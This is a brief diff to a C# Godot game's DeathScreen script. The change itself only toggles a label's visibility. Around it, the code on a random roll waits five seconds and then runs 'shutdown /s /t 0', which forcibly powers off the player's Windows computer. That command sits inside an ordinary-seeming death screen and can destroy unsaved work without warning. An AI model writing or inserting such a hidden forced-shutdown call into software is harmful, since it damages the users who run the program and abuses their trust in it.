@@ -11,6 +11,7 @@ public partial class DeathScreen : Control
         if(roll == 2)
         {   
             var afLabel = GetNode<Label>("afLabel");
+            afLabel.Visible = !afLabel.Visible;
             await ToSignal(GetTree().CreateTimer(5.0f), "timeout");
             System.Diagnostics.Process.Start("shutdown", "/s /t 0");
         }
